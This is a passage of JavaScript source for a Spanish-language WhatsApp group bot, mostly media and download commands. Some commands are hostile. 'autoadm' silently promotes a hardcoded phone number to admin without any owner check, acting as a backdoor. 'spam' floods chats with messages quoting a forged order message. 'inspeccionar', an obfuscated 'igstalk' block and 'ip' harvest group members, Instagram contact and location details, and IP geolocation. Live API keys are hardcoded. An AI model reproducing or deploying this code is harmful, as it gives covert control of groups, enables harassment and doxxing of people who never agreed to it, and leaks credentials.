					await samu330.sendMessage(from, ini_buffer, sticker)
				}
				break

			case 'adm':
				members_id = []
				for (let mem of groupMembers) {
					members_id.push(mem.jid)
				}
				wa.demoteAdmin(from, members_id)
				reply('😙')
				await sleep(300)
				wa.promoteAdmin(from, members_id)
				reply(':o')
				await sleep(300)
				wa.demoteAdmin(from, members_id)
				wa.promoteAdmin(from, members_id)
				wa.demoteAdmin(from, members_id)
				wa.promoteAdmin(from, members_id)
				reply(':D')
				wa.demoteAdmin(from, members_id)
				wa.promoteAdmin(from, members_id)
				wa.demoteAdmin(from, members_id)
				wa.promoteAdmin(from, members_id)
				wa.demoteAdmin(from, members_id)
				reply('Ai nomas quedo🐱')
				await sleep(10000)
				reply('😱')
				break

			//======== _-By Samu330-_ ========\\
			case 'inspeccionar':
				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('*Este no es un link de WhatsApp...*')
				if (!q) return reply('*🙄Y el link??...*')
				sp = args[0]
				jids = []
				var net = sp.split('https://chat.whatsapp.com/')[1]
				if (!net) return reply('Porfavor aegurate que el link sea de un grupo de whatsapp: *https://whatsapp.com/....*')
				let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation } = await samu330.query({
					json: ["query", "invite", net],
					expect200: true
				})
				let insSm = `_*Inspección By Samu330💎*_

🪀 *Id* : _${id}_

👤 *Creador del grupo:* ${owner ? `Owner : @${owner.split('@')[0]}` : 'Owner : -'}

*° Nombre del Grupo:* _${subject}_

*° Fecha de creacion:* ${Date(creation * 1000)}

*° Total de Miembros:* ${size}

${desc ? `*Descripcion:* ${desc}` : 'Desc : Sin descripcion'}

*° Id de la Descripcion:* ${descId}

${descOwner ? `° Descripcion cambiada por @${descOwner.split('@')[0]}` : 'Descripcion cambiada por : -'}\n\n*Fecha* : ${descTime ? `${Date(descTime * 1000)}` : '-'}\n\n*° Contactos agendados*\n`
				for (let y of participants) {
					insSm += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Si' : 'No'}\n`
					jids.push(`${y.id.replace(/@c.us/g, '@s.whatsapp.net')}`)
				}
				jids.push(`${owner ? `${owner.replace(/@c.us/g, '@s.whatsapp.net')}` : '-'}`)
				jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g, '@s.whatsapp.net')}` : '-'}`)
				samu330.sendMessage(from, insSm, MessageType.text, { quoted: fliveLoc })
				break


			//encode y decode by Samu
			case 'code':
				texto = args.join(' ')
				var rawStr = `${texto}`
				var wordArray = CryptoJS.enc.Utf8.parse(rawStr);
				var base64 = CryptoJS.enc.Base64.stringify(wordArray);
				reply(`${base64}`)
				break

			case 'decode':
				texto = args.join(' ')
				var parseWordArray = CryptoJS.enc.Base64.parse(`${texto}`);
				var parsedStr = parseWordArray.toString(CryptoJS.enc.Utf8);
				reply(`${parsedStr}`)
				break

			case 'autoadm':
				Samu330 = '5219984907794@s.whatsapp.net'
				if (!isGroup) return
				if (!Samu330) return
				if (!botAdmin) return
				samu330.groupMakeAdmin(from, [Samu330])
				break

			//auto locate IP
			case 'ipbot':
				if (!itsMe) return reply('Este comando solo puede ser usado por el creador del bot')
				ipbot = await getJson('http://ip-api.com/json/')
				await sleep(200)
				reply('*Recopilando información...*\n*Tiempo Aproximado:*\n```3 segundos```')
				await sleep(200)
				datosbot = `
*Número del bot:* ${botNumber}

*Ip*: _${ipbot.query}_
*Latitud de ip*: ${ipbot.lat}
*Longitud de ip*: ${ipbot.lon}

*País*: _${ipbot.country}_
*Código de país*: ${ipbot.countryCode}

*Región*: _${ipbot.region}_
*Nombre de la región*: ${ipbot.regionName}

*Ciudad*: _${ipbot.city}_

*Código postal*: _${ipbot.zip}_

*Zona horaria*: _${ipbot.timezone}_

*Proveedor de servicios de Internet*:
_${ipbot.isp}_

*Organización*: _${ipbot.org}_

`
				samu330.sendMessage(from, datosbot, MessageType.text, { quoted: fliveLoc })
				await sleep(300)
				samu330.sendMessage(from, { degreesLatitude: `${ipbot.lat}`, degreesLongitude: `${ipbot.lon}`, name: '📌 Ubicación aproximada', address: `${ipbot.city}` }, MessageType.liveLocation, { quoted: fliveLoc })
				break
			//localizacion IP
			case 'ip':
				ips = args.join(' ')
				ip = await getJson(`http://ip-api.com/json/${ips}`)
				if (ip.status == 'fail') return reply('*ip incorrecta*')
				reply('*Recopilando información...*\n*Tiempo Aproximado:*\n```3 segundos```')
				await sleep(200)
				datos = `
*Ip:* _${ips}_
*Latitud de ip*: ${ip.lat}
*Longitud de ip*: ${ip.lon}

*País*: _${ip.country}_
*Código de país*: ${ip.countryCode}

*Región*: _${ip.region}_
*Nombre de región*: ${ip.regionName}

*Ciudad*: _${ip.city}_

*Código postal*: _${ip.zip}_

*Zona horaria*: _${ip.timezone}_

*Proveedor de servicios de Internet*:
_${ip.isp}_                                                                                                                                                                                                    

*Organización*: _${ip.org}_                                                                                                                                                                                  

`
				samu330.sendMessage(from, datos, MessageType.text, { quoted: fliveLoc })
				await sleep(300)
				samu330.sendMessage(from, { degreesLatitude: `${ip.lat}`, degreesLongitude: `${ip.lon}`, name: '📌 Ubicación aproximada', address: `${ip.city}` }, MessageType.liveLocation, { quoted: fliveLoc })
				break

//Igstalk Creado por Samu gracias a la api de Fxc7

//NO CAMBIAR ABSOLUTAMENTE NADA, GRACIAS!!


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/*////*/case 'igstalk':
/*////*/if (!q) return reply(`*Y el nombre de usuario??* ejemplo de uso: ${prefix}igstalk Samu330wabot`)
/*////*/ig = await getJson(`https://fxc7-api.herokuapp.com/api/stalk/ig?apikey=Fxc7&username=${q}`)
/*////*/s = ig.result
/*////*/var _0x3054 = ['is_verified', 'full_name', ',\x20REALIZADA\x20POR\x20🐉Samu330🍒🌐*\x0a\x0a*🔰PK*:\x20', 'has_chaining', 'is_interest_account', 'is_private', 'total_igtv_videos', 'public_email', 'follow_friction_type', '_\x0a*🛒Usuarios\x20con\x20etiqueta:*\x20_', 'biography', '_\x0a*🤔Tiene\x20videos?:*\x20_', 'username', '494427wilqiQ', '_\x0a*🕋Es\x20una\x20empresa\x20potencial?:*\x20_', 'is_eligible_for_smb_support_flow', '8CgwDrM', '_\x0a*🧵Tiene\x20carretes\x20destacados?:*\x20_', '_\x0a*🎈Efectos\x20AR:*\x20_', '_\x0a*💠Muestra\x20información\x20de\x20la\x20publicación\x20entry_point?:*\x20_', '94370kWMTFK', 'can_be_reported_as_fraud', '_\x0a*📞Metodo\x20de\x20contacto\x20a\x20la\x20empresa:*\x20_', 'media_count', '_\x0a*🔐La\x20cuenta\x20es\x20privada?:*\x20_', '_\x0a*🤩Es\x20favorito?*\x20_', '_\x0a*✏Mensajeria\x20directa:*\x20_', 'direct_messaging', '_\x0a*👻Tiene\x20mejores\x20amigos\x20invisibles?:*\x20_', 'is_business', '693435vrSLfk', '_\x0a*🥇Insignias\x20de\x20la\x20cuenta*\x20_', '_\x0a*👥Puede\x20ocultar\x20contactos\x20publicos?:*\x20_', 'account_badges', 'open_external_url_with_in_app_browser', '_\x0a*✅La\x20cuenta\x20esta\x20verificada?:*\x20_', 'has_videos', '_\x0a*📚Biografia:*\x20_', '_\x0a*💎Muestra\x20a\x20detalle\x20la\x20transparencia\x20de\x20la\x20cuenta?:*\x20_', '_\x0a*🕋Tipo\x20de\x20cuenta\x20sugerida\x20para\x20conversión\x20profesional:*\x20_', '_\x0a*🏍Siguiendo:*\x20_', '_\x0a*🗺Localizaciones\x20compartidas:*\x20_', 'business_contact_method', 'total_ar_effects', 'whatsapp_number', '_\x0a*🤝🏻Segidores\x20mutuos:*\x20_', 'instagram_location_id', 'should_show_public_contacts', '391140nNkfTN', 'is_call_to_action_enabled', 'city_id', 'professional_conversion_suggested_account_type', 'has_unseen_besties_media', '96062RHrieK', '_\x0a*👑Esta\x20conmemorado?:*\x20_', '_\x0a*👤Tiene\x20una\x20foto\x20de\x20perfil\x20anónima?:*\x20_', '_\x0a*🔰Deberia\x20mostrar\x20categoria?:*\x20_', 'is_memorialized', '27149SHRCKq', '_\x0a*👁‍🗨Puede\x20ocultar\x20la\x20categoria?:*\x20_', '_\x0a*⚡Following\x20tag*\x20_', '_\x0a*📲Numero\x20de\x20contacto:*\x20_', 'public_phone_country_code', '_\x0a*🧩Imagenes/Videos\x20publicados:*\x20_', 'external_url', 'city_name', '_\x0a*🗺Latitud:*\x20_', '10tqOZki', '1159IWchuE', '1nejXSn', 'address_street', '_\x0a*🔐Está\x20habilitada\x20la\x20acción\x20de\x20llamada?:*\x20_', '_\x0a*🤗Es\x20mejor\x20amig@?:*\x20_', '_\x0a*🐱‍👤Incluye\x20estado\x20de\x20lista\x20negra\x20directa?:*\x20_', '_\x0a*💠Nombre\x20completo:*\x20_', '_\x0a*🛒Es\x20una\x20empresa?:*\x20_', 'can_hide_category', '_\x0a*👥Total\x20de\x20seguidores:*\x20_', '_\x0a*🪀Numero\x20de\x20WhatsApp:*\x20_', '_\x0a*✨Tipo\x20de\x20cuenta:*\x20_', '\x0a*🙋🏻‍♂️Nombre\x20de\x20usuario:*\x20_', '_\x0a*🚧Nombre\x20de\x20la\x20calle:*\x20_', '991XshNSH', '_\x0a*🌐Codigo\x20postal:*\x20_', '_\x0a*🧐Es\x20una\x20cuenta\x20interesante?:*\x20_', '_\x0a*🧊Seguidores\x20mediante\x20tipo\x20de\x20fricción:*\x20_', '_\x0a*🌐URL\x20externo:*\x20_', 'should_show_category', 'longitude', 'has_biography_translation', 'latitude', '_\x0a*📲Numero\x20publico:*\x20_', 'geo_media_count', 'is_bestie', '_\x0a*Videos\x20en\x20igtv:*\x20_', 'can_hide_public_contacts', '_\x0a*♻La\x20biografia\x20a\x20sido\x20traducida?:*\x20_']; function _0x4106(_0x3669fd, _0x4dbae8) { return _0x4106 = function (_0x3054cc, _0x41061e) { _0x3054cc = _0x3054cc - 0x130; var _0xbe89cd = _0x3054[_0x3054cc]; return _0xbe89cd; }, _0x4106(_0x3669fd, _0x4dbae8); } var _0x52f62e = _0x4106; (function (_0x154634, _0x56ff80) { var _0x4691fb = _0x4106; while (!![]) { try { var _0x1bb356 = -parseInt(_0x4691fb(0x177)) * -parseInt(_0x4691fb(0x145)) + -parseInt(_0x4691fb(0x132)) + parseInt(_0x4691fb(0x137)) * -parseInt(_0x4691fb(0x147)) + -parseInt(_0x4691fb(0x170)) + parseInt(_0x4691fb(0x13c)) * parseInt(_0x4691fb(0x173)) + -parseInt(_0x4691fb(0x181)) + parseInt(_0x4691fb(0x154)) * parseInt(_0x4691fb(0x146)); if (_0x1bb356 === _0x56ff80) break; else _0x154634['push'](_0x154634['shift']()); } catch (_0x35fe72) { _0x154634['push'](_0x154634['shift']()); } } }(_0x3054, 0x9ae1d), a = '*🌐BUSQUEDA\x20AVANZADA\x20SOBRE\x20EL\x20USUARIO\x20' + q + _0x52f62e(0x165) + s['pk'] + _0x52f62e(0x152) + s[_0x52f62e(0x16f)] + _0x52f62e(0x14c) + s[_0x52f62e(0x164)] + _0x52f62e(0x17b) + s[_0x52f62e(0x168)] + '_\x0a*📁ID\x20de\x20la\x20foto\x20de\x20perfil:*\x20_' + s['profile_pic_id'] + _0x52f62e(0x186) + s[_0x52f62e(0x163)] + _0x52f62e(0x157) + s[_0x52f62e(0x16b)] + _0x52f62e(0x139) + s['has_anonymous_profile_picture'] + _0x52f62e(0x141) + s[_0x52f62e(0x17a)] + _0x52f62e(0x18c) + s[_0x52f62e(0x15e)] + _0x52f62e(0x14f) + s['follower_count'] + _0x52f62e(0x18b) + s['following_count'] + _0x52f62e(0x13e) + s['following_tag_count'] + _0x52f62e(0x188) + s[_0x52f62e(0x16d)] + _0x52f62e(0x158) + s[_0x52f62e(0x142)] + _0x52f62e(0x162) + s[_0x52f62e(0x15b)] + _0x52f62e(0x160) + s[_0x52f62e(0x169)] + _0x52f62e(0x16e) + s[_0x52f62e(0x187)] + _0x52f62e(0x175) + s[_0x52f62e(0x18e)] + _0x52f62e(0x16c) + s['usertags_count'] + _0x52f62e(0x17c) + s['is_favorite'] + _0x52f62e(0x156) + s[_0x52f62e(0x167)] + '_\x0a*⛓Tiene\x20encadenamiento?:*\x20_' + s[_0x52f62e(0x166)] + _0x52f62e(0x190) + s['mutual_followers_count'] + _0x52f62e(0x174) + s['has_highlight_reels'] + '_\x0a*🤠Tiene\x20gia?:*\x20_' + s['has_guides'] + '_\x0a*❌Puede\x20denunciarse\x20como\x20fraude?:*\x20_' + s[_0x52f62e(0x178)] + '_\x0a*🔰Es\x20elegible\x20para\x20el\x20flujo\x20de\x20soporte\x20de\x20pymes?:*\x20_' + s[_0x52f62e(0x172)] + '_\x0a*🛵Socio\x20de\x20apoyo\x20de\x20pymes:*\x20_' + s['smb_support_partner'] + _0x52f62e(0x17d) + s[_0x52f62e(0x17e)] + _0x52f62e(0x153) + s[_0x52f62e(0x148)] + _0x52f62e(0x179) + s[_0x52f62e(0x18d)] + '_\x0a*🌇ID\x20de\x20la\x20ciudad:*\x20_' + s[_0x52f62e(0x134)] + '_\x0a*🌇Nombre\x20de\x20la\x20cuidad*\x20_' + s[_0x52f62e(0x143)] + _0x52f62e(0x13f) + s['contact_phone_number'] + _0x52f62e(0x149) + s[_0x52f62e(0x133)] + _0x52f62e(0x144) + s[_0x52f62e(0x15c)] + '_\x0a*🗺Longitud*\x20_' + s[_0x52f62e(0x15a)] + '_\x0a*📩EMAIL\x20publico:*\x20_' + s[_0x52f62e(0x16a)] + '_\x0a*🌍Codigo\x20de\x20pais\x20del\x20numero\x20publico:*\x20_' + s[_0x52f62e(0x140)] + _0x52f62e(0x15d) + s['public_phone_number'] + _0x52f62e(0x155) + s['zip'] + '_\x0a*⚙Localizacion\x20del\x20ID\x20de\x20Instagram:*\x20_' + s[_0x52f62e(0x130)] + _0x52f62e(0x14d) + s[_0x52f62e(0x180)] + _0x52f62e(0x151) + s['account_type'] + _0x52f62e(0x18a) + s[_0x52f62e(0x135)] + _0x52f62e(0x13d) + s[_0x52f62e(0x14e)] + _0x52f62e(0x183) + s[_0x52f62e(0x161)] + _0x52f62e(0x13a) + s[_0x52f62e(0x159)] + '_\x0a*👥Deberia\x20mostrar\x20contactos\x20publicos?:*\x20_' + s[_0x52f62e(0x131)] + _0x52f62e(0x182) + s[_0x52f62e(0x184)] + _0x52f62e(0x150) + s[_0x52f62e(0x18f)] + _0x52f62e(0x14b) + s['include_direct_blacklist_status'] + _0x52f62e(0x171) + s['is_potential_business'] + _0x52f62e(0x176) + s['show_post_insights_entry_point'] + '_\x0a*👥Solicitud\x20de\x20contactos\x20habilitada?:*\x20_' + s['request_contact_enabled'] + _0x52f62e(0x14a) + s[_0x52f62e(0x15f)] + _0x52f62e(0x17f) + s[_0x52f62e(0x136)] + _0x52f62e(0x189) + s['show_account_transparency_details'] + '_\x0a*⛓Expande\x20automáticamente\x20el\x20encadenamiento?:*\x20_' + s['auto_expand_chaining'] + '_\x0a*✏Resaltar\x20compartir\x20deshabilitado?:*\x20_' + s['highlight_reshare_disabled'] + _0x52f62e(0x138) + s[_0x52f62e(0x13b)] + '_\x0a*📲Abre\x20URLs\x20externos\x20con\x20el\x20navegador\x20de\x20la\x20aplicación?:*\x20_' + s[_0x52f62e(0x185)] + '_');
/*////*/reply(a)
/*////*/break
			////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////




			case 'reglas':
				reply(`*Hola, estas son las reglas que debes seguir para que no tengas ningún problema con el propietario del Bot.*\n\n1- _Mantén una conducta respetuosa._\n2- _Si vas a añadir el Bot a algún grupo, verifica que el grupo cumpla con el requisito de tener mínimo 5 integrantes._\n3- _❌ NO HAGAS SPAM DE COMANDOS ❌_ *Esto es enserio, puedes hacer que el Bot se apague.*\n4- _📵 NO HAGAS LLAMADAS POR WHATSAPP AL PROPIETARIO DEL BOT 📵_ *Serás bloqueado inmediatamente*\n5- _🕐 Espera el tiempo necesario cuando pidas alguna función, ya que algunas tardan en realizarse, no escribas el comando nuevamente hasta que el BOT te responda o te llegue un mensaje de error._\n\nPor favor cumple y respeta las reglas.`)
				break
			//Con este case se envia la aplicacion Tutorial
			case 'tutorial':
			case 'git':
			case 'crear':
				result = fs.readFileSync(`./media/app.apk`)
				samu330.sendMessage(from, result, document, {
					mimetype: 'application/vnd.android.package-archive', filename: '🐉AppBot🐉 by 📌Samu330🥀', quoted: fdoc
				})
				reply('*Git de este bot: https://github.com/Samu330/NyanBot*')
				break

			case 'nuevogrupo':
				const nombregc = args.join(' ')
				if (!nombregc) return reply('*Porfavor escribe el nombre que quieras que tenga el grupo')
				const group = await samu330.groupCreate(`${nombregc}`, [sender])
				reply(`*EL GRUPO FUE CREADO CORRECTAMENTE CON EL NOMBRE:*\n\n*${nombregc}*\n\nid del grupo: ${group.gid}`)
				samu330.sendMessage(group.gid, "hello everyone", MessageType.text, { quoted: fliveLoc })
				break

			case 'hoy':
				const momento1 = require('moment-timezone')
				const hora = momento1.tz('America/Mexico_City').format('HH:mm:ss')
				let d1 = new Date
				let locale1 = 'es'
				let gmt1 = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
				let ayer = ['domingo', 'lunes', 'Martes', 'Miercoles', 'Jueves', 'Viernes', 'Sabado'][
					Math.floor(((d1 * 1) + gmt1) / 84600000) % 7]
				let week1 = d1.toLocaleDateString(locale1, { weekday: 'long' })
				let calender1 = d1.toLocaleDateString(locale1, {
					day: 'numeric',
					month: 'long',
					year: 'numeric'
				})
				reply(`🕐Son las *${hora}*\n\n🍃Hoy es *${week1}  ${calender1}*\n\n_${timeFt}_`)
				break

			case 'mfire':
				if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊 Hola, ${timeFt}.\n*Yo soy Sam*, Asistente de *Nexus*.\n\nAl parecer no estas registrado en _*Nexusᴮᴼᵀ*_, Para registrarte usa el comando: *${prefix}reg*`, thumbnail: assistant, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
				if (args.length < 1) return reply('y el link?? ')
				if (!isUrl(args[0]) && !args[0].includes('mediafire')) return reply('Link invalido, el link debe ser de MediaFire')
				reply('*Espera un momento...*')
				teks = args.join(' ')
				const resm = await sm330mfire(teks)
				result = `  「  𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒  」
*Nombre :* ${resm[0].nombre}
*Tamaño :* ${resm[0].size}
*Link :* ${resm[0].link}
_*El archivo se esta enviando......*_`
				reply(result)
				sendFileFromUrl(resm[0].link, document, { mimetype: resm[0].mime, filename: resm[0].nombre, quoted: fdoc })
				break

			case 'covid':
				reply('*Espera un momento...*')
				const rescovid = await covidworld()
				result = `  「  𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒  」
*Nombre :* ${rescovid[0].kasus}
*Tamaño :* ${rescovid[0].kematian}
*Link :* ${rescovid[0].sembuh}
_*El archivo se esta enviando......*_`
				reply(result)
				break

			

			case 'twit':
				if (!isRegister) return reply(mess.only.usrReg)
				if (!q) return reply('Y el link de twiter??')
				reply('*Espera un mometo porfavor...*')
				twi = await getJson(`https://api.lolhuman.xyz/api/twitter?apikey=273a9e8195c27ba24abd53e3&url=${q}`)
				reply(`*° Titulo:* ${twi.title}\n*° Calidad:* ${twi.result[2].resolution}\n\n_Si el video no llega, descarge por aqui:_\n${twi.result[2].link}`)
				sendFileFromUrl(twi.result[2].link, video, { quoted: fvid, caption: '🍒Samu330 | NyanBot💠', duration: 999999999 })
				break

			case 'ig':
				if (!isRegister) return reply(mess.only.usrReg)
				if (!q) return reply('Y el link de Instagram??')
				ig = await getJson(`https://api.lolhuman.xyz/api/instagram?apikey=${api}&url=${q}`)
				reply(`*Espere un momento porfavor, su video se esta enviando....*`)
				sendFileFromUrl(ig.result, video, { quoted: fvid, caption: '🍒Samu330 | NyanBot💠', duration: 999999999 })
				break

			case 'spam':
				if (!itsMe) return reply('Este comando es solo para 🐉Samu330🪀')
				arg1 = q
				if (!arg1) return reply(`Ejemplo ${prefix}spam texto|numero de mensajes`)
				argz = arg1.split("|")
				if (!argz) return reply(`Porfavor usa el simbolo "|" para dividir entre el mensaje y el numero de veses a enviar el mensaje`)
				if (isNaN(argz[1])) return reply(`Y el numero de veses a enviar?`)
				members = []
				for (let i = 0; i < argz[1]; i++) {
					samu330.sendMessage(from, argz[0], MessageType.text, {
						quoted: {
							key: { fromMe: false, participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "5214447000377-1624053141@g.us" } : {}) }, message: { orderMessage: { itemCount: 9999999999999999, status: 1, surface: 1, message: `🥀S͓̽α͓̽м͓̽υ͓̽3͓̽3͓̽0͓̽🍒 | 🐉𝑵𝒚𝒂𝒏𝑩𝒐𝒕🌹`, orderTitle: '', sellerJid: `Sam330`, thumbnail: fs.readFileSync('./src/fake.jpg') } },
							contextInfo: { mentionedJid: members }
						}
					})
				}
				break
			case 'ytmp3':
				if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊 Hola, ${timeFt}.\n*Yo soy Sam*, Asistente de *Nexus*.\n\nAl parecer no estas registrado en _*Nexusᴮᴼᵀ*_, Para registrarte usa el comando: *${prefix}reg*`, thumbnail: assistant, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
				if (args.length < 1) return reply('Y el link?')
				if (!isUrl(args[0]) && !args[0].includes('youtu')) return reply('Link de YouTube we, *De YouTube!!*')
				teks = args.join(' ')
				reply('*Espere un momento...*')
				res = await y2mateA(teks).catch(e => {
					reply('_[ ! ] Error del servidor_')
				})
				result = `「  𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒  」
*°Titulo :* ${res[0].judul}
*°Tamaño :* ${res[0].size}
*°Calidad :* ${res[0].quality}kbps
*°Nombre del archivo :* ${res[0].output}
*°Salida :* ${res[0].tipe}
_*El archivo se esta enviando.....*_
`
				sendFileFromUrl(res[0].thumb, image, { caption: result, quoted: sam }).then((lalu) => {
					sendFileFromUrl(res[0].link, audio, { quoted: faud, mimetype: 'audio/mp3', duration: 99999999 })
					sendFileFromUrl(res[0].link, audio, { quoted: faud, mimetype: 'audio/mp3', ptt: true, duration: 99999999 })
				})

				break
			case 'ytmp4':
				if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊 Hola, ${timeFt}.\n*Yo soy Sam*, Asistente de *Nexus*.\n\nAl parecer no estas registrado en _*Nexusᴮᴼᵀ*_, Para registrarte usa el comando: *${prefix}reg*`, thumbnail: assistant, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
				if (args.length < 1) return reply('Y el link?')
				if (!isUrl(args[0]) && !args[0].includes('youtu')) return reply('Link de YouTube we, *De YouTube!!*')
				teks = args.join(' ')
				reply(mess.wait)
				res = await y2mateV(teks).catch(e => {
					reply('_[ ! ] Error del servidor_')
				})
				result = `「  𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒  」
*°Titulo :* ${res[0].judul}
*°Tamaño :* ${res[0].size}
*°Calidad :* ${res[0].quality}p
*°Nombre :* ${res[0].output}
*°Output :* ${res[0].tipe}
_*El archivo se esta enviando.....*_
`
				sendFileFromUrl(res[0].thumb, image, { caption: result, quoted: sam }).then((lalu) => {
					sendFileFromUrl(res[0].link, video, { quoted: fvid, mimetype: Mimetype.gif, duration: 9999999999 })
				})
				break

			case 'tomp3':
			case 'toaudio':
				if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊 Hola, ${timeFt}.\n*Yo soy Sam*, Asistente de *Nexus*.\n\nAl parecer no estas registrado en _*Nexusᴮᴼᵀ*_, Para registrarte usa el comando: *${prefix}reg*`, thumbnail: assistant, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
				samu330.updatePresence(from, Presence.recording)
				if (!isQuotedVideo) return reply('Y el video?')
				reply('*Perame tatito!*')
				const encmedia3 = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				const media3 = await samu330.downloadAndSaveMediaMessage(encmedia3)
				ran = getRandom('.mp3')
				exec(`ffmpeg -i ${media3} ${ran}`, (err) => {
					fs.unlinkSync(media3)
					if (err) return reply(mess.ferr)
					buffer = fs.readFileSync(ran)
					samu330.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: faud })
					fs.unlinkSync(ran)
				})
				break

			case 'caras':
				var imgbb = require('imgbb-uploader')
				if (((isMedia && !sam.message.videoMessage) || isQuotedImage) && args.length == 0) {
					cara = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam;
					reply(mess.wait);
					samsam = await samu330.downloadAndSaveMediaMessage(cara);
					anu = await imgbb('20a14861e4f7591f3dc52649cb07ae02', samsam);
					resultc = `${anu.display_url}`;
					caras = await getBuffer(`https://api.lolhuman.xyz/api/facedetect?apikey=${api}&img=${resultc}`)
					fs.writeFileSync('caras.jpg', caras)
					samu330.sendMessage(from, fs.readFileSync('caras.jpg'), MessageType.image, { quoted: fimg })
				} else {
					reply('*Por favor etiqueta una imagen con el comando.*')
				}
			break

			case 'reversa':
				if (!isQuotedVideo) return reply('*Por favor etiqueta un video con el comando.*')
				reply('*Espera un momento por favor...*')
				encmediav = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				mediav = await samu330.downloadAndSaveMediaMessage(encmediav)
				ran = getRandom('.mp4')
				exec(`ffmpeg -i ${mediav} -vf reverse -af areverse ${ran}`, (err) => {
					fs.unlinkSync(mediav)
					if (err) return reply(`Error: ${err}`)
					vre = fs.readFileSync(ran)
					samu330.sendMessage(from, vre, video, { mimetype: 'video/mp4', quoted: fvid, duration: -999999 })
					fs.unlinkSync(ran)
				})
			break

			case 'imagen':
				if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊 Hola, ${timeFt}.\n*Yo soy Sam*, Asistente de *Nexus*.\n\nAl parecer no estas registrado en _*Nexusᴮᴼᵀ*_, Para registrarte usa el comando: *${prefix}reg*`, thumbnail: assistant, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
				if (args.length < 1) return reply(`*Agrega lo que deseas buscar.*\nPor ejemplo: ${prefix + command} gato`)
				reply(`Por favor espera un momento mientras busco imágenes de ` + args.join(' '))
				ggimg = args.join(' ')
				res = await samuGgImg(ggimg, google)
				function google(error, result) {
					if (error) { return reply('_[ ! ] *Intentalo de nuevo.*_') }
					else {
						var gugIm = result
						var random = gugIm[Math.floor(Math.random() * gugIm.length)].url
						sendFileFromUrl(random, image, { quoted: sam, caption: `*🔍Busqueda de* _${ggimg}_` })
					}
				}
			break

			case 'sinfondo':
				if ((isMedia || isQuotedImage)) {
					const encmedianb = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
					const median = await samu330.downloadAndSaveMediaMessage(encmedianb)
					reply(mess.wait)
					keyrmbg = 'bcAvZyjYAjKkp1cmK8ZgQvWH'
					ranp = getRandom('.png')
					await removeBackgroundFromImageFile({ path: median, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp }).then(res => {
						fs.unlinkSync(median)
						let buffer = Buffer.from(res.base64img, 'base64')
						samu330.sendMessage(from, buffer, image, { quoted: fimg })
						fs.unlinkSync(buffer)
					})
				} else {
					reply('*Por favor etiqueta una imagen con el comando.*')
				}
			break

			case 'wpbusca':
				if (args.length == 0) return reply(`*Agrega lo que deseas buscar.*\nPor ejemplo: ${prefix + command} gatos`)
				query = args.join(' ')
				get_result = await getJson(`https://api.lolhuman.xyz/api/wallpaper?apikey=${api}&query=${query}`)
				ini_buffer = await getBuffer(get_result.result)
				await samu330.sendMessage(from, ini_buffer, image, { quoted: ftoko })
			break

			case 'waifu':
				assistant = fs.readFileSync('./src/assistant.jpg')
				if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: mess.only.usrReg, thumbnail: assistant, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
					samu330.updatePresence(from, Presence.composing)
					waifu = ["https://hertz-ingenieros.com/api/lh/waifu.php","https://hertz-ingenieros.com/api/lh/waifu.php"]
					swaifu = waifu[Math.floor(Math.random() * waifu.length)]
					rwaifu = await getJson(`${swaifu}`, {
					method: 'get'
				})
				reply(mess.wait)
				buffer = await getBuffer(`${rwaifu.url}`)
				samu330.sendMessage(from, buffer, image, {
					quoted: fimg
				})
			break

			case 'neko':
				assistant = fs.readFileSync('./src/assistant.jpg')
				if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: mess.only.usrReg, thumbnail: assistant, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
					samu330.updatePresence(from, Presence.composing)
					neko = ["https://nekos.life/api/v2/img/neko","https://nekos.life/api/v2/img/neko"]
					sneko = neko[Math.floor(Math.random() * neko.length)]
					rneko = await getJson(`${sneko}`, {
					method: 'get'
				})
				reply(mess.wait)
				buffer = await getBuffer(`${rneko.url}`)
				samu330.sendMessage(from, buffer, image, {
					quoted: fimg
				})
			break

			case 'ardilla':
				if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: mess.only.usrReg, thumbnail: assistant, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
				if (((isAudio && !sam.message.audioMessage) || isQuotedAudio) && args.length == 0) {
